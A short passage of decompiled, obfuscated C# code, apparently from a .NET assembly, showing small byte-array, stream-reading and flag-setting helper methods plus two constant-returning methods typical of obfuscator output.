				IL_01f3:
				num2 = class24_0.int_5;
				goto IL_023b;
				continue;
				end_IL_0259:
				break;
			}
		}
	}

	static byte[] smethod_157(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class42.smethod_40(byte_2, byte_0, 3, byte_1);
	}

	static int smethod_158(Class15.Stream0 stream0_0)
	{
		return Class42.smethod_8(stream0_0) | (Class42.smethod_8(stream0_0) << 16);
	}

	static void smethod_159(Class15.Class21 class21_0)
	{
		class21_0.int_0 |= 12;
	}

	internal static bool gW67GT4Mxy6wW4pIs8r()
	{
		return true;
	}

	internal static bool TclQyZ4yUTE7ipDsBqA()
	{
		return false;
	}
}
